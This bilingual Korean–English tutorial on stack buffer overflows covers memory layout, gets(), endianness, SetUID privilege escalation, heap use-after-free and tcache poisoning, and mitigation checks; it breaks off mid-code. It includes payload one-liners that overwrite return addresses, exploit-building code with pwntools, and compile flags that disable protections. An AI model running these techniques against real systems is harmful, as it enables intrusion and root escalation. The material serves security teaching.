- C언어에서는 **변수(variable)**가 버퍼로 사용된다

**버퍼 오버플로우** = 사용자가 입력한 데이터의 크기가 버퍼 용량을 초과하여 넘쳐버리는 현상. 인접한 메모리 영역을 침범하여 프로그램에 문제를 일으킨다.

### 11-3. C언어에서 버퍼 사용하기

**변수 형과 크기 (32비트 기준)**:

| 변수형 | 크기 | 최소값 | 최대값 |
|--------|------|--------|--------|
| char | 1바이트 | -128 | 127 |
| short int | 2바이트 | -32768 | 32767 |
| int | 4바이트 | -2147483648 | 2147483647 |
| long int | 4바이트 | -2147483648 | 2147483647 |
| unsigned char | 1바이트 | 0 | 255 |
| unsigned short int | 2바이트 | 0 | 65535 |
| unsigned int | 4바이트 | 0 | 4294967295 (= 2^32-1) |

C 언어의 배열 버퍼 선언과 사용법 예시입니다. 입력 크기를 검증하지 않으면 버퍼 오버플로우 취약점이 발생합니다.

```c
// 배열 변수로 버퍼 선언 (ex3.c ~ ex5.c)
char c[13] = {'H', 'a', 'c', 'k', 'e', 'r', 's', 'c', 'h', 'o', 'o', 'l', '\0'};
// 또는 더 간단하게:
char c[13] = "Hackerschool";
// 또는 크기 자동 계산:
char c[] = "Hackerschool";   // char c[13]과 동일

// sizeof로 변수 크기 확인
int i = 77;
printf("i의 크기 : %d\n", sizeof(i));  // → 4

// &(앤퍼센트)로 메모리 주소 확인
printf("i의 메모리 주소 : 0x%x\n", &i);  // → 0xbfffe784 (환경마다 다름)
```

**버퍼 크기 계산**: `char name[20]` → 1바이트 × 20개 = **20바이트 버퍼**. 20바이트를 초과하는 입력이 들어오면 오버플로우 발생.

### 11-4. 변수의 메모리 주소 이해

하나의 변수는 세 가지 정보를 가진다 ("삼겹살"):
1. **메모리 주소** (변수가 실제 위치하는 주소)
2. **할당 크기** (바이트 단위)
3. **저장된 값**

**변수 선언 순서와 메모리 주소의 관계 (스택 기준)**:

```
// 코드 (ex1.c)
int a = 1;   // 주소: 0xbffffb44
int b = 2;   // 주소: 0xbffffb40
int c = 3;   // 주소: 0xbffffb3c
int d = 4;   // 주소: 0xbffffb38

메모리 배치 (낮은 주소 → 높은 주소):
d(4)  c(3)  b(2)  a(1)
0x38  0x3c  0x40  0x44
```

**핵심 규칙**: 나중에 선언된 변수일수록 낮은 메모리 주소에 할당된다.

**정수형 + 배열 혼합 시**:
```
// char b[20] = "hello"; int a = 1;
// b가 나중에 선언 → 낮은 주소에 할당
b         a
0xbffffb30  0xbffffb44
20바이트    4바이트
```

**패스워드 우회 취약점 원리** (`real_quiz.c`):
```c
int auth = 0;       // 먼저 선언 → 높은 주소
char passwd[20];    // 나중에 선언 → 낮은 주소 (auth 바로 아래 20바이트)

gets(passwd);  // passwd[20]을 초과하면 auth를 덮어씀!
if(strcmp(passwd, "비밀번호") == 0) auth = 1;
if(auth) printf("인증 성공!\n");
```
→ `passwd`에 21바이트 이상 입력하면 `auth` 값이 변조되어 패스워드 없이 인증 통과 가능.

### 11-5. gets() 함수 취약점 상세

`gets()` 함수 동작 방식:
- **인자**: 입력값을 저장할 버퍼의 시작 주소 (`buffer`는 `&buffer[0]`과 동일)
- **종료 조건**: 엔터(`\n`) 입력 시까지
- **크기 제한 없음**: 엔터 전에 입력한 모든 값을 지정 주소에 저장

```
"사용자가 엔터를 치기 전까지 입력한 값들을
 인자로 주어진 메모리 주소에 저장한다."
```

컴파일 시 경고 메시지:
```
xxx: the `gets' function is dangerous and should not be used.
```

### 11-6. 함수 호출과 복귀 메커니즘

**함수가 여러 번 호출되는 문제**: 복귀 주소를 코드에 고정하면 무한 루프 발생. 따라서 함수를 호출하기 직전에 "다음에 실행될 코드의 주소"를 메모리에 기록하는 방식을 사용.

```
이 "복귀할 때 참조할 위치(주소)"를 "리턴 어드레스(Return Address)"라고 부른다.
```

**실제 메모리 배치** (get_area() 호출 시):
```
[낮은 주소]
자식함수 area(0xbfffee54) | ??? | ??? | 인자x(0xbfffee60) | 인자y(0xbfffee64) | ...부모의 변수들
                           ↑SFP  ↑RET
```

**메모리 주소 규칙 (함수 호출 시)**:
- 자식 함수의 지역변수 < SFP < 리턴 어드레스 < 자식 함수의 인자 < 부모 함수의 지역변수
- 함수 인자는 선언 순서 그대로 낮은 주소부터 할당 (지역변수와 반대)

### 11-7. 리턴 어드레스 변조 — 공격의 핵심

```
SFP              리턴 어드레스
[자식 area] [SFP값] [다음코드주소] [인자x] [인자y] [부모 변수들]
   ↑
   여기서 버퍼 오버플로우 발생 시
   리턴 어드레스까지 덮어쓸 수 있다!
```

**결론**: 버퍼 오버플로우로 리턴 어드레스를 변조하면 함수 종료 후 원하는 주소로 점프 가능.

### 11-8. Hexdump로 메모리 보기 — dumpcode.h 실습

**리눅스에서 hex 확인 도구**:
- `xxd /bin/ls` → 바이너리를 16진수로 출력 (높은 바이트 먼저)
- `hexdump /bin/ls` → xxd와 바이트 순서 반대

**코드로 메모리 덤프하기**:
```c
// 기본 hex dump (ex2.c)
int i;
char str[20] = "hackerschool!";
printf("0x%08x ", &str);        // 주소 출력
for(i=0; i<sizeof(str); i++)
    printf("%02x ", str[i]);    // 16진수 값 출력
// 결과: 0xbffffb30 68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 ...
```

**dumpcode.h 사용법** (ohhara 작성):
```c
#include "dumpcode.h"

// str 변수에서부터 100바이트 출력
dumpcode((unsigned char *)&str, 100);
// 결과 형식:
// 0xbffffb30  68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 00 00   hackerschool!...
```

`dumpcode()`를 `/usr/include/`에 복사하면 어느 경로에서도 include 가능.

### 11-9. 리틀 엔디안과 빅 엔디안 상세

**유래**: "걸리버 여행기" (1726년 조나단 스위프트)의 달걀 깨는 방향 논쟁 → Danny Cohen의 논문에서 컴퓨터 용어로 처음 사용.

**Big Endian 장점**:
- 두 수 비교 시 빠름 (첫 바이트가 크면 나머지 비교 불필요)
- 사람이 읽는 방식과 동일 (왼쪽 → 오른쪽)

**Little Endian 장점**:
- 짝수/홀수 판별 빠름 (첫 바이트만 보면 됨)
- 포인터 역참조 시 유리 (낮은 바이트가 먼저 위치)
- 자릿수 증가 연산이 빠름

```
// 값 10(0x0000000A)을 int 변수에 저장 시:
dumpcode(&test, 4);
// 결과: 0xbffffb44  0a 00 00 00  ← Little Endian (낮은 바이트 먼저)
// 사람이 읽는 순서(Big Endian): 00 00 00 0a
```

**CPU별 엔디안**:
- Little Endian: Intel x86/x64, AMD, ARM (일반적)
- Big Endian: Motorola 68000, SPARC, 네트워크 표준 (TCP/IP)
- Byte Ordering 변환 함수: `htons()`, `htonl()` (host to network)

### 11-10. 메모리 값 변조 실습 (트레이닝 코스)

**문자열 변수 변조 (DOG → CAT)**:
```bash
# buffer[20] 다음에 target[4] = "DOG" 가 위치
# 20바이트 채우고 이어서 CAT 입력
$ ./ex1 AAAAAAAAAAAAAAAAAAAAACAT
# 결과: AAAACAT → target = CAT
```

**정수형 변수 변조 (1234 → 5678)**:
```bash
# 주의: 키보드 입력은 모두 '문자'로 처리됨
# 문자 '5678' = 0x35 0x36 0x37 0x38 → 943142453 (오답)

# perl로 숫자값 직접 입력 (백쿼터 활용)
# 10진수 5678 = 16진수 0x162E
# Little Endian: \x2e\x16
$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x2e\x16"'`
# 결과: [*] AFTER : the value of target is 5678

# 해커 숫자 31337 = 0x7A69 → Little Endian: \x69\x7a
$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x69\x7a"'`
```

**리턴 어드레스 변조**:
```bash
# buffer[20] + SFP[4] = 24바이트 채운 후 원하는 주소 입력
# 리턴 어드레스를 0x12345678로 변조
$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x78\x56\x34\x12"'`
# → Segmentation fault (엉뚱한 주소로 점프했기 때문)

# 0xdeadbeef로 변조 (해커들이 좋아하는 "죽은 고기")
$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\xef\xbe\xad\xde"'`
```

**핵심**: 4바이트 16진수를 Little Endian으로 역순 입력. Segmentation fault가 나타나면 리턴 어드레스 변조 성공.

### 11-11. 완전한 메모리 맵 (32비트 프로세스)

**32비트 주소 범위**: 0x00000000 ~ 0xFFFFFFFF (= 4GB)

**가상 메모리 구조**:
```
낮은 주소 (0x00000000)
┌─────────────────────┐
│  미할당 영역          │  0x00000000 ~ 약 0x08040000
├─────────────────────┤
│  코드 영역 (Text)    │  기계어 코드 위치 (예: 0x080483c8)
├─────────────────────┤
│  데이터 영역 (Data)  │
│  ├ 초기화된 데이터   │  전역변수, 정적변수 (초기값 있음) (예: 0x08049478)
│  └ 비초기화 (BSS)   │  전역변수, 정적변수 (초기값 없음) (예: 0x08049568)
├─────────────────────┤
│  힙 영역 (Heap)      │  malloc() 동적할당 (예: 0x08049588) → 주소 증가 방향
├─────────────────────┤
│      빈 공간         │  힙이 커질수록 채워짐
├─────────────────────┤
│  공유 라이브러리     │  libc.so.6 등 (예: 0x4006604c)
│  (Shared Library)   │  → printf, scanf 등 모든 라이브러리 함수
├─────────────────────┤
│      빈 공간         │
├─────────────────────┤
│  스택 영역 (Stack)   │  지역변수, 리턴어드레스, 함수인자 (예: 0xbffffb44)
│                     │  ← 주소 감소 방향으로 성장
├─────────────────────┤
│  커널 영역 (Kernel)  │  0xc0000000 ~ 0xFFFFFFFF (1GB)
└─────────────────────┘
높은 주소 (0xFFFFFFFF)
```

**유저 영역 3GB + 커널 영역 1GB** = 4GB 총 가상 메모리

**커널 영역 접근 시**: Segmentation fault 발생 (보호 영역)

**메모리 영역 낮은 주소부터 순서**:
코드 → 초기화 데이터 → 비초기화 데이터(BSS) → 힙 → (빈 공간) → 공유 라이브러리 → (빈 공간) → 스택 → 커널

**각 영역 주소 확인 방법**:
```c
// 1. 코드 영역
printf("0x%08x\n", &main);   // → 0x080483c8

// 2. 초기화 데이터
int a = 10;  // 전역변수 (초기화)
printf("&a = 0x%08x\n", &a); // → 0x08049478

// 3. 비초기화 데이터
int a;       // 전역변수 (비초기화)
printf("&a = 0x%08x\n", &a); // → 0x08049568

// 4. 힙
char *heap = (char *)malloc(100);
printf("heap = 0x%08x\n", heap); // → 0x08049588

// 5. 라이브러리 (dlopen/dlsym 활용)
// printf() is at 0x4006604c

// 6. 스택 (지역변수)
int a;
printf("&a = 0x%08x\n", &a); // → 0xbffffb44
```

**프로세스**: 가상 메모리에 적재된 실행 중인 프로그램. 새 프로세스 실행 시 독립적인 4GB 가상 메모리 할당.

### 11-12. 스택 영역 심화

**스택 특성 (LIFO - Last In First Out)**:
- 가장 나중에 들어온 데이터가 가장 먼저 나간다
- PUSH: 스택에 데이터 추가 (TOP의 주소 감소)
- POP: 스택에서 데이터 제거 (TOP의 주소 증가)

**TOP과 BOTTOM**:
- **TOP (Stack Pointer)**: 현재 스택에 쌓인 데이터 중 가장 낮은 메모리 주소. 데이터 추가/제거 기준. PUSH 시 감소, POP 시 증가.
- **BOTTOM**: 스택 가장 아래 (가장 높은 주소). 항상 0xc0000000 (커널 경계)에 해당.

**스택이 높은 주소 → 낮은 주소 방향으로 자라는 이유**:
1. 커널 영역(높은 주소)을 절대 침범하지 않음
2. 힙은 낮은→높은 방향으로 성장하므로, 서로 마주보며 메모리 공간을 알뜰하게 활용

**스택 그리는 세 가지 방법**:
1. 세로 (데이터 쌓이는 방향 직관적, 위가 TOP)
2. 세로 역방향 (높은 주소가 위에 위치)
3. 가로 (메모리 맵과 연계, 왼쪽이 낮은 주소 = TOP)

### 11-13. 스택에 저장되는 값들 실제 확인

**1. 지역변수 스택 저장 순서**:
```c
int a = 1, b = 2, c = 3, d = 4;
dumpcode((unsigned char *)&d, 16);
// → 0xbffffb38  [04 00 00 00] [03 00 00 00] [02 00 00 00] [01 00 00 00]
// d(4) c(3) b(2) a(1) 순으로 낮은 주소 → 높은 주소
```

**1바이트/2바이트 변수의 스택 저장**:
- 스택 기본 단위 = 4바이트
- `char x = 7` (1바이트): 부족한 3바이트는 **dummy(쓰레기) 값**으로 채움
- `short x = 7` (2바이트): 부족한 2바이트 dummy
- Byte Ordering(Little Endian 변환)은 **2바이트 이상**에서만 발생

```
// char x = 7; 스택 결과:
[03 00 00 00] [eb 83 04 07] [02 00 00 00]
     c         dummy|x=07      b
// short x = 7; 스택 결과:
[03 00 00 00] [eb 83 07 00] [02 00 00 00]
     c         dummy|x=0007    b   (Byte Ordering 발생)
```

**2. 리턴 어드레스 스택 확인**:
```c
// func() 호출 시 스택 덤프
// 0xbffffb28  [06 00 00 00] [05 00 00 00] [48 fb ff bf] [2f 86 04 08]
//              func의 b      func의 a      SFP(Saved     RET(리턴주소)
//                                         Frame Pointer)
```

**3. 함수 인자의 스택 저장 순서**:
- 함수 인자는 선언 순서의 **역순**으로 스택에 저장됨
- `func(arg1, arg2)` → 스택에는 arg2가 먼저 PUSH되고 arg1이 나중에

```c
// func(10, 20) 호출 시 스택:
// [func의b] [func의a] [SFP] [RET] [arg1=0a] [arg2=14] [main의d..a]
```

**스택 프레임 (Stack Frame)**:
- 하나의 함수에 속한 지역변수 + SFP + 리턴 어드레스 + 함수 인자의 묶음
- 모든 함수는 자신만의 스택 프레임을 가짐
- 함수 호출 순서가 LIFO → 스택 자료구조와 완벽히 일치

**스택 프레임 전체 구조 (낮은 주소 → 높은 주소)**:
```
[자식함수 지역변수들] [SFP] [RET] [자식함수 인자들] [부모함수 지역변수들]
```

### 11-14. 큐(Queue) — 스택과 비교

| 특성 | 스택(Stack) | 큐(Queue) |
|------|-------------|-----------|
| 처리 방식 | LIFO (후입선출) | FIFO (선입선출) |
| 비유 | 동전통, 연탄 더미 | 양쪽 뚫린 파이프, 줄 서기 |
| 활용 예 | 함수 호출/복귀 | 키보드 입력, 프린터 스풀 |

### 11-15. 로컬/리모트 버퍼 오버플로우와 해킹 5단계

**해킹의 5단계**:

1. **정보 수집**: 도메인, IP, OS, 작동 서비스 파악. 취약한 부분 탐색.
2. **리모트 어택 (Remote Attack)**: 계정 없이 서버 접근 권한 획득.
   - 사회공학적 해킹 (패스워드 추측)
   - 웹 해킹 (SQL Injection, XSS, 파일 업로드)
   - 시스템 해킹 (BOF, Format String 등)
   - → 이 과정에 BOF 사용 시 **리모트 버퍼 오버플로우(Remote BOF)**
3. **로컬 어택 (Local Attack)**: 일반 사용자 권한 → root 권한 상승.
   - SetUID bit 파일 취약점, 로컬 서비스 취약점, 커널 취약점
   - → 이 과정에 BOF 사용 시 **로컬 버퍼 오버플로우(Local BOF)**
4. **흔적 삭제**: 접속 로그 삭제 (로그 파일에 클라이언트 IP, 수신 데이터 기록됨)
5. **백도어 생성**: 재침투를 위한 비밀 통로 설치

### 11-16. SetUID bit 상세

**개념**: 실행 파일에 설정하는 속성. 이 속성이 부여된 파일은 **실행 중 파일 소유자의 권한으로 작동**.

**필요한 이유**: 일반 사용자가 자신의 패스워드를 변경할 때 `/etc/passwd`, `/etc/shadow`에 접근해야 하므로, `/bin/passwd` 실행 중에만 일시적으로 root 권한 필요.

```bash
# SetUID 확인
$ ls -al /usr/bin/passwd
-r-s--x--x    1 root     root        12244 Feb  8  2000 /usr/bin/passwd
#   ↑ 's' 속성 = SetUID bit 설정됨 (소유자 root의 권한으로 실행)

# SetUID 파일 찾기
$ find / -perm -4000 2>/dev/null        # SetUID 파일 검색 (에러 출력 제거)
$ find / -perm -4000                    # SetUID 파일 검색 (에러 출력 포함)
$ find / -perm -g+s 2>/dev/null        # SetGID 파일 검색

# SetUID 설정/해제
$ chmod u+s 파일명   # SetUID 설정
$ chmod u-s 파일명   # SetUID 해제
$ chmod g+s 파일명   # SetGID 설정
$ chmod g-s 파일명   # SetGID 해제
$ chmod ug+s 파일명  # SetUID + SetGID 동시 설정
```

**SetUID와 BOF의 결합 = 권한 상승 공격**:
- 정상적인 SetUID: 프로그램 실행 중만 해당 소유자 권한, 제한된 기능
- SetUID 파일에 BOF 취약점이 있으면: 실행 흐름 변경으로 제한을 벗어나 root 권한으로 임의 명령 실행 가능

**관련 권한 개념**:
- `euid` (effective UID): 해당 파일 실행 동안 갖는 실제 권한
- `chown root:root file`: 파일 소유자와 그룹을 root로 변경
- `2>/dev/null`: 표준 에러 출력을 `/dev/null`로 버림 (에러 메시지 숨기기)

---

## 12. Q&A 핵심 정리 (BOF 왕기초편)

### 주요 개념 답변

| 질문 | 답변 |
|------|------|
| Buffer란? | 키보드 등으로부터 받은 데이터의 임시 저장 공간 |
| Buffer Overflow란? | 버퍼 크기를 초과한 데이터 입력으로 버퍼가 넘쳐서 인접 메모리를 침범하는 현상 |
| gets() 함수란? | 문자열 길이를 체크하지 않고 문자열을 받아오는 표준입력함수 |
| Return Address 역할? | 이전 함수로 복귀하기 위한 주소 저장. 무한 루프 방지. |
| 스택 LIFO 의미? | Last In First Out — 후입선출 |
| 큐 FIFO 의미? | First In First Out — 선입선출 |
| Segmentation fault란? | 리턴 어드레스가 잘못된 값으로 변조되어 올바른 메모리 세그먼트를 찾지 못한 상황 |
| 가상 메모리란? | 32비트 시스템에서 4GB의 가상 메모리를 논리적으로 구성하여 물리 메모리와 Mapping 시킨 것 |
| Swapping이란? | 사용되지 않는 메모리 페이지를 하드디스크에 임시저장하여 물리 메모리 공간 확보 |
| 스택 프레임이란? | 지역변수, SFP, 리턴 어드레스, 함수 인자가 합쳐진 하나의 함수 단위 스택 묶음 |
| ESP란? | Extended Stack Pointer Register — 현재 스택 TOP(포인터)의 위치를 가리키는 레지스터 |
| ASLR 약자? | Address Space Layout Randomization — 주소 공간 랜덤 배치 |
| DEP 약자? | Data Execution Prevention — 데이터 실행 방지 |
| euid란? | Effective UID — 파일 실행 동안 갖는 실제 유효 권한 |

### Little Endian 변환 예시

| 원래 값 | Little Endian (메모리 저장) |
|---------|---------------------------|
| 0xDEADBEEF | `\xef\xbe\xad\xde` |
| 0x12345678 | `\x78\x56\x34\x12` |
| 5678 (0x162E) | `\x2e\x16` |
| 31337 (0x7A69) | `\x69\x7a` |

### 실습 명령어 정리

버퍼 오버플로우 실습을 위한 컴파일 및 디버깅 명령어 모음입니다. -fno-stack-protector와 -z execstack 옵션으로 보호 기법을 비활성화합니다.

```bash
# 프로그램 컴파일
gcc -o test test.c

# 인자 전달
./test abc def

# perl로 숫자값 전달 (백쿼터 + -e 옵션)
./program `perl -e 'print "\x78\x56\x34\x12"'`

# python으로 숫자값 전달 (-c 옵션)
./program `python -c 'print "\x78\x56\x34\x12"'`

# 자신의 권한 확인
id
whoami

# SetUID 파일 찾기 (에러 숨김)
find / -perm -4000 2>/dev/null

# 심볼릭 링크 생성
ln -s test test1

# hex dump 보기
xxd 파일명

# 라이브러리 함수 목록 보기
/usr/bin/nm /lib/libc.so.6 | more
```

---

## 13. 힙 익스플로잇 기초 — Use-After-Free와 tcache Poisoning

지금까지 다룬 공격은 모두 **스택** 오버플로우였다. 하지만 `malloc`/`free`로 관리되는 **힙**도 별도의 취약점 계열을 갖는다. glibc는 해제된 청크(chunk)를 크기별 **tcache**(thread-local cache) 연결 리스트에 재사용을 위해 보관하는데, 이 리스트 구조 자체를 공격자가 조작할 수 있다는 것이 핵심이다.

```
[Use-After-Free (UAF) 원리]

포인터 p = malloc(64)로 힙 메모리 할당
free(p) 호출 → 메모리는 해제됐지만 p는 여전히 그 주소를 가리킴(댕글링 포인터)
프로그램이 실수로 free(p) 이후에도 p를 계속 사용
  → 그 사이 공격자가 같은 크기로 malloc해 그 메모리를 재할당받으면
    공격자가 채운 데이터를 프로그램이 "정상 객체"로 오인해서 사용
```

```c
// 취약한 코드 예시: free 후 포인터를 NULL로 만들지 않음(댕글링 포인터)
Chunk *p = malloc(sizeof(Chunk));
p->vtable = &safe_vtable;
free(p);          // 메모리 해제, 그러나 p는 여전히 유효한 값을 가리킴
p->vtable->run();  // UAF! 공격자가 그 사이 재할당해 vtable을 조작했다면 임의 코드 실행
```

```
[tcache poisoning 원리 (glibc ≥ 2.26)]

1) 같은 크기의 청크 A, B를 malloc 후 free(A); free(B)
   → tcache 연결 리스트: B -> A (LIFO, 단일 연결 리스트, 최근엔 안전 검사 있으나 우회 가능)
2) UAF나 힙 오버플로우로 B의 "다음 청크 포인터" 필드를 임의 주소(target)로 덮어씀
   → tcache 리스트: target -> A
3) 같은 크기로 두 번 malloc
   → 첫 malloc은 B를 반환, 두 번째 malloc이 target 주소를 그대로 반환
   → 공격자는 임의 주소를 "정상 힙 청크"인 것처럼 쓸 수 있게 됨 (예: GOT 덮어쓰기)
```

```bash
# pwndbg/GEF로 힙 상태 시각화 (실습 필수 도구)
gdb -q ./vuln
pwndbg> heap            # 전체 힙 청크 레이아웃
pwndbg> bins             # tcache/fastbin/unsorted bin 리스트 확인
pwndbg> tcache            # tcache 구조체 상세

# 힙 취약점 자동 탐지 보조 (Glibc 버전별 오프셋 차이 확인 필수)
pwndbg> vis_heap_chunks
```

**탐지/방어**: glibc 2.29+는 `tcache` 항목에 대한 이중 해제(double-free) 검사를 도입했지만 완전한 차단은 아니므로, 애플리케이션 레벨에서는 free 직후 반드시 포인터를 `NULL`로 초기화하고 재사용 전 유효성 검증을 습관화한다. 힙 익스플로잇 방어의 근본은 취약점 자체를 없애는 것(정적 분석/퍼징으로 UAF·double-free 탐지)이며, 런타임에서는 하드닝 malloc 구현체(예: glibc `Scudo`, `hardened_malloc`)나 ASan(AddressSanitizer)으로 개발 단계에서 조기 탐지한다.

---

<!-- detect-validate-03 -->
## 버퍼 오버플로우 탐지와 방어 검증

BOF 는 *어떻게 제어흐름을 탈취하는가*를 다루지만, 방어자는 **익스플로잇이 크래시 로그·완화 트립 어디에 흔적을 남기는가**와 **ASLR·NX·스택카나리·RELRO 가 실제로 활성인가**를 검증해야 한다. 공격자도 어떤 완화가 켜져 있는지 이 관점으로 가늠한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 스택 스매싱 | 리턴주소 | 스택 카나리, FORTIFY | `*** stack smashing detected ***`, SIGSEGV |
| ret2libc/ROP | NX(DEP) | ASLR, CFI | 비정상 RIP, 라이브러리 게이트 호출 시퀀스 |
| GOT 덮어쓰기 | 동적 링크 | Full RELRO | GOT 쓰기 시도, 비정상 메모리 보호 변경 |
| 정보 누출(ASLR 우회) | 주소 랜덤화 | 누출 최소화, 로깅 | 반복 크래시 후 정밀 오프셋 시도 |

### 방어 검증 (직접 확인)

```bash
# 1) 바이너리에 완화가 실제 켜졌는지 검증(소유 빌드) — checksec
checksec --file=./vuln    # NX enabled, Stack canary found, PIE, Full RELRO 확인
# 2) 호스트 ASLR 가 완전 활성인지 사실 확인
cat /proc/sys/kernel/randomize_va_space   # 2 여야 완전 랜덤화(0이면 비활성)
# 3) 스택 스매싱 탐지 — 크래시 로그(coredump/journald)에서 카나리 메시지 확인
journalctl -k | grep -i 'stack smashing' | tail
```

> 검증은 반드시 **소유한 바이너리·통제 환경**에서만. "카나리/NX/ASLR 켰다"와 "익스플로잇을 실제 차단한다"는 다르다 — PoC 를 재현해 완화가 크래시로 막는지 확인해야 신뢰할 수 있다([[09_Exploit_Techniques]], [[66_Exploit_Development]]).

**최신 기법·통제 (2025–2026):**
- ASLR·DEP/NX·스택카나리·CET로 고전 BOF 무력화 — 완화 활성시 익스플로잇이 실패하는지 재현(소유 랩). 검증: checksec류로 완화가 실제 적용됐는가([[66_Exploit_Development]])
- 잔존은 정보유출로 완화를 우회 — infoleak 프리미티브가 막히는지 확인([[09_Exploit_Techniques]])

---

<a name="english"></a>

# Buffer Overflow — Complete Guide to Stack-Based Overflow

## 1. Memory Structure Basics

### Process Memory Layout

Process memory is divided into code, data, heap, and stack regions. A buffer overflow attack works by exceeding the allocated buffer size in the stack region to overwrite the Return Address.

```
High Address
┌─────────────────────────┐
│      Stack              │ ← Local variables, function args, return address
│       ↓ (grows down)    │
│─────────────────────────│
│                         │
│─────────────────────────│
│       ↑ (grows up)      │
│      Heap               │ ← malloc, calloc, new
│─────────────────────────│
│      BSS                │ ← Uninitialized global/static variables
│─────────────────────────│
│      Data               │ ← Initialized global/static variables
│─────────────────────────│
│      Text (Code)        │ ← Executable code, constants
└─────────────────────────┘
Low Address
```

### Stack Structure

The stack grows from high to low addresses, with ESP pointing to the current top of the stack. Since return addresses and local variables are stored here during function calls, overwriting the return address via buffer overflow redirects execution flow.

```
IA-32 (32-bit) Stack:
- Grows from high address to low address
- PUSH: decrements ESP then stores value
- POP:  reads value then increments ESP
- ESP: Stack Pointer (points to top of stack)
- EBP: Base Pointer (stack frame base)

Stack Frame Structure:
┌──────────────────┐  High Address
│  Caller Arguments │
│──────────────────│
│  Return Address  │ ← Key target to overwrite via BoF
│──────────────────│
│  Saved EBP       │ ← Previous EBP value
│──────────────────│
│  Local Variable1 │ ← EBP - 4
│  Local Variable2 │ ← EBP - 8
│  buffer[128]     │ ← Overflow via gets(), strcpy(), etc.
└──────────────────┘  Low Address (← ESP)
```

---

## 2. Buffer Overflow Principle

### Vulnerable Code Example

Functions like `strcpy()` and `gets()` that copy user input into a buffer without size checking are the primary cause of buffer overflows. The code below accepts arbitrary-length input into a 64-byte buffer, which can corrupt the stack.

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];        // 64-byte buffer
    strcpy(buffer, input);  // No size check! → vulnerable
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable_function(argv[1]);
    return 0;
}
```

### Stack State Changes
```
Normal execution:
┌────────────────┐
│  argv[1]       │  "hello" (5 bytes)
│  ...           │
│ Return Address │  0x08048400
│ Saved EBP      │  0xbfff1000
│ buffer[64]     │  "hello\0..."
└────────────────┘

During attack (input ≥ 64 + 4 + 4 + 4 = 72 bytes):
┌────────────────┐
│ Return Address │  0x41414141 (AAAA) ← Control hijacked!
│ Saved EBP      │  0x41414141 (AAAA)
│ buffer[64]     │  AAAA...AAAA (64 bytes)
└────────────────┘
```

---

## 3. gets() Function Vulnerability

### gets() vs fgets() Comparison

The `gets()` function does not limit input length, making it vulnerable to buffer overflow. It must be replaced with `fgets()` or functions that validate input length.

```c
// Dangerous: gets() has no input length limit
char buf[64];
gets(buf);          // Vulnerable! any amount of input accepted

// Safe: fgets() limits input size
char buf[64];
fgets(buf, sizeof(buf), stdin);  // Safe
```

### List of Vulnerable Functions
| Function | Risk | Safe Alternative |
|----------|------|-----------------|
| gets() | Unlimited size | fgets() |
| strcpy() | No size check | strncpy(), strlcpy() |
| strcat() | No size check | strncat(), strlcat() |
| sprintf() | Unlimited output | snprintf() |
| scanf("%s") | No size limit | scanf("%63s") |

---

## 4. Understanding Endianness — Key Concept

### Big Endian vs Little Endian
```
Storing value 0x12345678 in memory:

Big Endian (Network byte order):
Address: 0x100  0x101  0x102  0x103
Value:   0x12   0x34   0x56   0x78   ← High byte at low address

Little Endian (x86/x64 Intel):
Address: 0x100  0x101  0x102  0x103
Value:   0x78   0x56   0x34   0x12   ← Low byte at low address
```

### Endianness in Exploits
```python
# Packing address in x86 little endian
import struct

address = 0xbfff1234
# In memory: \x34\x12\xff\xbf
packed = struct.pack('<I', address)
print(repr(packed))  # b'\x34\x12\xff\xbf'

# In exploit code
payload  = b"A" * 64         # Fill buffer
payload += b"B" * 4          # Overwrite Saved EBP
payload += struct.pack('<I', 0xbfff1234)  # Overwrite Return Address
```

---

## 5. Memory Hexdump Analysis

### Inspecting Memory with gdb

GDB (GNU Debugger) is the key tool for analyzing and verifying buffer overflows on Linux. Using PEDA or pwndbg plugins visualizes registers, stack, and heap state in color for easier analysis.

```bash
# Compile (disable protections)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

# Run GDB
gdb ./vuln
(gdb) disas main
(gdb) disas vulnerable_function

# Set breakpoint and run
(gdb) break *vulnerable_function+XX
(gdb) run $(python3 -c "print('A'*80)")

# Check registers
(gdb) info registers
(gdb) x/16x $esp      # Print 16 hex values from ESP
(gdb) x/s $eax        # Print EAX as string
(gdb) x/10i $eip      # Print 10 instructions from EIP
```

### Reading Hexdumps
```
Memory dump example:
0xbfff1000: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
0xbfff1010: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
...
0xbfff1040: 42 42 42 42  78 56 34 12                              BBBB.x4.

Analysis:
0xbfff1000 ~ 0xbfff103F: 64 'A' bytes (buffer region)
0xbfff1040 ~ 0xbfff1043: 4 'B' bytes (Saved EBP overwritten)
0xbfff1044 ~ 0xbfff1047: \x78\x56\x34\x12 = 0x12345678 (Return Address)
```

---

## 6. Practical Buffer Overflow Attack

### Step-by-Step Attack Procedure
```
Step 1: Confirm vulnerability (Fuzzing)
   → Trigger crash with large input

Step 2: Calculate offset (distance to EIP)
   → Find exact offset with cyclic pattern

Step 3: Find Return Address
   → Shellcode location or useful gadget address

Step 4: Write exploit
   → payload = padding + new_return_address + shellcode

Step 5: Execute attack and obtain shell
```

### Calculating Offset with Cyclic Pattern

Use pwntools' cyclic pattern to precisely calculate the offset to EIP. After crashing with the pattern, use the EIP value to determine the exact overwrite offset.

```python
from pwn import *

# Generate cyclic pattern (200 bytes)
pattern = cyclic(200)
print(pattern)
# aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...

# Calculate offset from value in EIP
# Example: EIP = 0x61616166 ('faaa')
offset = cyclic_find(0x61616166)
print(offset)  # → 20 (20 bytes from buffer to EIP)

# pwntools GDB automation — offset measurement helper
def measure_offset(binary: str, pattern_size: int = 300, timeout: int = 5) -> int | None:
